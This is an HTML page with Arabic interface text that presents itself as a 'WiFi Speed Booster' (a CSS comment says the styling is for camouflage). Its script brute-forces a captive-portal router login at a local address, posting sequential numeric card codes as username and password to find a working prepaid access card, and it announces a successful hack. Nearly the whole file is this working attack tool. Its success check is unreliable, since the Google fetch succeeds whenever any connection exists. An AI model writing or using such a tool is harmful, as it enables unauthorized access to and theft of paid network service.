<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Speed Booster</title>
    <style>
        /* تصميم احترافي للتمويه */
        body { background: #0f0f0f; color: #00d4ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
        .container { border: 2px solid #00d4ff; border-radius: 15px; padding: 20px; box-shadow: 0 0 20px #00d4ff; max-width: 400px; margin: auto; }
        h1 { font-size: 22px; text-shadow: 2px 2px #000; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #00d4ff; background: #1a1a1a; color: #fff; text-align: center; }
        button { width: 95%; padding: 15px; background: #00d4ff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        #status-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 10px; height: 150px; overflow-y: auto; font-size: 13px; border: 1px dashed #444; text-align: left; direction: ltr; }
        .success-text { color: #ccff00; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="container">
    <h1>WIFI SPEED BOOSTER v4.0</h1>
    <p style="font-size: 12px;">قم بزيادة سرعة النت عبر تخطي قيود الراوتر</p>
    
    <input type="text" id="targetUrl" value="http://10.0.0.1/login">
    <input type="number" id="startRange" placeholder="أدخل كود البداية (مثلاً 1000)">
    
    <button onclick="startBruteForce()">تفعيل التسريع (Start)</button>

    <div id="status-box">
        [System] Ready to intercept...<br>
    </div>
</div>

<script>
    async function startBruteForce() {
        const target = document.getElementById('targetUrl').value;
        const start = parseInt(document.getElementById('startRange').value);
        const log = document.getElementById('status-box');

        if (!start) {
            alert("الرجاء إدخال رقم البداية!");
            return;
        }

        log.innerHTML += "[+] Initiating Brute Force Attack...<br>";

        for (let i = 0; i < 3000; i++) {
            let currentCard = start + i;
            log.innerHTML += `[*] Testing ID: ${currentCard}...<br>`;
            log.scrollTop = log.scrollHeight;

            try {
                // إرسال طلب تسجيل دخول صامت
                let controller = new AbortController();
                let timeoutId = setTimeout(() => controller.abort(), 1000); // سرعة عالية

                let formData = new FormData();
                formData.append('username', currentCard);
                formData.append('password', currentCard);

                await fetch(target, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors',
                    signal: controller.signal
                });

                // فحص ذكي للنجاح: إذا تم فتح الإنترنت
                if (navigator.onLine) {
                    // محاولة تحميل بكسل من جوجل للتأكد
                    try {
                        let check = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
                        log.innerHTML += `<span class="success-text">[!!!] SUCCESS: Valid Card Found -> ${currentCard}</span><br>`;
                        alert("تم الاختراق بنجاح! الكرت الشغال: " + currentCard);
                        break; 
                    } catch(e) { /* لم يفتح النت بعد */ }
                }

            } catch (err) {
                // استمرار في حال الفشل أو التايم أوت
            }
        }
    }
</script>

</body>
</html>
